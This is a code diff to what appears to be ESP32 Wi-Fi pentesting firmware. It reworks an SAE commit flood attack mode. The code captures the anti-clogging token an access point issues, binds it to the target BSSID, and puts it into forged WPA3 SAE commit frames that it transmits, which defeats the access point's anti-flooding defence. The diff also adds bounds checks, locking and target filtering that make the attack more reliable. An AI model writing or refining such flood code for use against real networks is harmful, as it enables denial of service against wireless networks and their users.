@@ -5,13 +5,50 @@
 #include "BeaconFrame.h"
 #include "WdgResponse.h"
 #include "lang_var.h"
+#include "freertos/FreeRTOS.h"
 
 #ifdef HAS_PSRAM
   struct mac_addr* mac_history = nullptr;
 #endif
 
 static const uint8_t *g_filter_bssid = nullptr;
-uint8_t *current_act = nullptr;
+
+namespace {
+  constexpr size_t SAE_COMMIT_FRAME_CAPACITY = 256;
+  constexpr size_t SAE_COMMIT_PREFIX_LENGTH = 32;  // 802.11 auth fields + group
+  constexpr size_t SAE_GROUP_19_SCALAR_LENGTH = 32;
+  constexpr size_t SAE_GROUP_19_ELEMENT_LENGTH = 64;
+  constexpr size_t SAE_COMMIT_BASE_LENGTH =
+    SAE_COMMIT_PREFIX_LENGTH +
+    SAE_GROUP_19_SCALAR_LENGTH +
+    SAE_GROUP_19_ELEMENT_LENGTH;
+  constexpr size_t MAX_SAE_ACT_LENGTH =
+    SAE_COMMIT_FRAME_CAPACITY - SAE_COMMIT_BASE_LENGTH;
+  static_assert(SAE_COMMIT_BASE_LENGTH <= SAE_COMMIT_FRAME_CAPACITY,
+                "SAE commit base exceeds frame capacity");
+
+  portMUX_TYPE sae_act_mux = portMUX_INITIALIZER_UNLOCKED;
+  uint8_t current_act[MAX_SAE_ACT_LENGTH] = {};
+  size_t current_act_len = 0;
+  uint8_t current_act_bssid[6] = {};
+  bool current_act_valid = false;
+
+  void clearCurrentSaeAct() {
+    portENTER_CRITICAL(&sae_act_mux);
+    memset(current_act, 0, sizeof(current_act));
+    memset(current_act_bssid, 0, sizeof(current_act_bssid));
+    current_act_len = 0;
+    current_act_valid = false;
+    portEXIT_CRITICAL(&sae_act_mux);
+  }
+
+  bool hasCurrentSaeAct() {
+    portENTER_CRITICAL(&sae_act_mux);
+    const bool available = current_act_valid && (current_act_len > 0);
+    portEXIT_CRITICAL(&sae_act_mux);
+    return available;
+  }
+}
 
 MacEntry WiFiScan::mac_entries[mac_history_len_half];
 uint8_t WiFiScan::mac_entry_state[mac_history_len_half];
@@ -2996,6 +3033,11 @@ void WiFiScan::StopScan(uint8_t scan_mode) {
   #ifdef HAS_GPS
     gps_obj.disable_queue();
   #endif
+
+  if ((currentScanMode == WIFI_SCAN_SAE_COMMIT) ||
+      (currentScanMode == WIFI_ATTACK_SAE_COMMIT)) {
+    clearCurrentSaeAct();
+  }
 }
 
 void WiFiScan::getMAC(bool get_sta, uint8_t* mac) {
@@ -6442,6 +6484,8 @@ void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color) {
 }
 
 void WiFiScan::RunSAEScan(uint8_t scan_mode, uint16_t color) {
+  clearCurrentSaeAct();
+
   if (scan_mode == WIFI_SCAN_SAE_COMMIT)
     this->startPcap("sae_commit");
   else if (scan_mode != WIFI_ATTACK_SAE_COMMIT)
@@ -8175,7 +8219,7 @@ void WiFiScan::saeAttackLoop(uint32_t currentTime) {
       #endif
 
       display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
-      if (current_act)
+      if (hasCurrentSaeAct())
         display_obj.tft.print(F("ACT: SET"));
       else
         display_obj.tft.print(F("ACT: NOT SET"));
@@ -8230,14 +8274,14 @@ bool WiFiScan::initMbedtls() {
 }
 
 bool WiFiScan::sendSAECommitFrame(uint8_t* targ_addr, uint8_t* src_addr) {
-  uint8_t frame[256];
+  uint8_t frame[SAE_COMMIT_FRAME_CAPACITY];
   uint8_t ecp_point_bin[65];
   size_t bin_len = 0;
   int write_bin_result = -1;
 
   memset(frame, 0, sizeof(frame));
 
-  for (int i = 0; i < 32; i++) // Copy frame header
+  for (size_t i = 0; i < SAE_COMMIT_PREFIX_LENGTH; i++) // Copy frame prefix
     frame[i] = sae_commit[i];
 
   for (int i = 0; i < 6; i++) { // Copy addresses
@@ -8248,8 +8292,20 @@ bool WiFiScan::sendSAECommitFrame(uint8_t* targ_addr, uint8_t* src_addr) {
 
   frame[30] = 0x13;  // SAE Group
 
-  uint8_t *current_index = frame + 32;
-  size_t scalar_len = 32;
+  uint8_t *current_index = frame + SAE_COMMIT_PREFIX_LENGTH;
+  size_t scalar_len = SAE_GROUP_19_SCALAR_LENGTH;
+
+  // In a classic SAE commit the token follows the group directly, before the
+  // scalar and element. Copy only the token bound to this target BSSID.
+  portENTER_CRITICAL(&sae_act_mux);
+  if (current_act_valid &&
+      (current_act_len > 0) &&
+      (current_act_len <= MAX_SAE_ACT_LENGTH) &&
+      (memcmp(targ_addr, current_act_bssid, sizeof(current_act_bssid)) == 0)) {
+    memcpy(current_index, current_act, current_act_len);
+    current_index += current_act_len;
+  }
+  portEXIT_CRITICAL(&sae_act_mux);
 
   if (mbedtls_mpi_fill_random(&prec_int, scalar_len, mbedtls_ctr_drbg_random, &ctr_drbg) != 0)
     return false;
@@ -8271,24 +8327,11 @@ bool WiFiScan::sendSAECommitFrame(uint8_t* targ_addr, uint8_t* src_addr) {
   for (size_t i = 0; i < scalar_len; i++)
     current_index++;
 
-  for (size_t i = 0; i < 64; i++)
+  for (size_t i = 0; i < SAE_GROUP_19_ELEMENT_LENGTH; i++)
     current_index[i] = ecp_point_bin[i + 1];
 
-  for (int i = 0; i < 64; i++)
+  for (size_t i = 0; i < SAE_GROUP_19_ELEMENT_LENGTH; i++)
     current_index++;
-
-  // If ACT exists, append it to the frame
-  if (this->current_act_len > 0 && current_act != NULL) {
-    *current_index++ = 0x4C; // ACT required
-
-    *current_index++ = this->current_act_len;
-
-    for (size_t i = 0; i < this->current_act_len; i++)
-      current_index[i] = current_act[i];
-
-    for (int i = 0; i < this->current_act_len; i++)
-      current_index++;
-  }
 
   if (esp_wifi_80211_tx(WIFI_IF_STA, frame, current_index - frame, false) != ESP_OK)
     return false;
@@ -8305,52 +8348,78 @@ bool WiFiScan::sendSAECommitFrame(uint8_t* targ_addr, uint8_t* src_addr) {
 bool WiFiScan::getSAEACT(const uint8_t *frame, size_t frame_len, uint16_t &group_out, size_t &act_len_out) {
   extern WiFiScan wifi_scan_obj;
 
-  bool is_sae = false;
-  uint8_t frame_header_len = 32;
-  bool ap_found = false;
+  constexpr size_t frame_header_len = SAE_COMMIT_PREFIX_LENGTH;
+  // wifi_pkt_rx_ctrl_t::sig_len includes the four-byte 802.11 FCS. It is
+  // transport metadata, not part of the anti-clogging token.
+  constexpr size_t frame_check_sequence_len = 4;
+  group_out = 0;
+  act_len_out = 0;
 
   // Filter on SAE commit
   if ((frame_len > frame_header_len) &&
       (frame[0] == 0xB0) &&
-      (frame[24] == 0x03) &&
-      (frame[26] == 0x01)) {
-    is_sae = true;
+      (le16(frame + 24) == 0x0003) &&
+      (le16(frame + 26) == 0x0001)) {
+    const uint8_t *src_addr = frame + 10;
+    const uint8_t *frame_bssid = frame + 16;
 
-    // Check if filtering on AP
-    if (wifi_scan_obj.filterActive()) {
-      uint8_t src_addr[6];
-      wifi_scan_obj.getMAC(src_addr, frame, 10);
+    if (!wifi_scan_obj.mac_cmp(src_addr, frame_bssid))
+      return false;
+
+    const bool require_selected_target =
+      (wifi_scan_obj.currentScanMode == WIFI_ATTACK_SAE_COMMIT) ||
+      wifi_scan_obj.filterActive();
+    if (require_selected_target) {
+      if (access_points == nullptr)
+        return false;
+
+      bool selected_ap_found = false;
       for (int i = 0; i < access_points->size(); i++) {
-        if (wifi_scan_obj.mac_cmp(src_addr, access_points->get(i).bssid)) {
-          ap_found = true;
+        const AccessPoint access_point = access_points->get(i);
+        if (access_point.selected &&
+            wifi_scan_obj.mac_cmp(src_addr, access_point.bssid)) {
+          selected_ap_found = true;
           break;
         }
       }
 
-      if (!ap_found)
+      if (!selected_ap_found)
         return false;
     }
 
-    // Filter on ACT required
-    if (frame[28] == 0x4C) {
+    group_out = le16(frame + 30);
 
-      const uint8_t *act_index = frame + frame_header_len;
-      act_len_out = frame_len - frame_header_len;
+    if (le16(frame + 28) == 0x004C) {
+      if (frame_len <= (frame_header_len + frame_check_sequence_len))
+        return false;
 
-      // Copy ACT
-      if (act_len_out != 0) {
-        if (current_act)
-          free(current_act);
-
-        current_act = (uint8_t *)malloc(act_len_out);
-        if (current_act) {
-          memcpy(current_act, act_index, act_len_out);
-        }
+      const size_t received_act_len =
+        frame_len - frame_header_len - frame_check_sequence_len;
+      if ((group_out != 19) ||
+          (received_act_len == 0) ||
+          (received_act_len > MAX_SAE_ACT_LENGTH)) {
+        return false;
       }
+
+      portENTER_CRITICAL(&sae_act_mux);
+      memcpy(current_act, frame + frame_header_len, received_act_len);
+      if (received_act_len < sizeof(current_act)) {
+        memset(current_act + received_act_len,
+               0,
+               sizeof(current_act) - received_act_len);
+      }
+      memcpy(current_act_bssid, frame_bssid, sizeof(current_act_bssid));
+      current_act_len = received_act_len;
+      current_act_valid = true;
+      portEXIT_CRITICAL(&sae_act_mux);
+
+      act_len_out = received_act_len;
     }
+
+    return true;
   }
 
-  return is_sae;
+  return false;
 }
 
 bool WiFiScan::checkFlockOUI(const uint8_t mac[6]) {
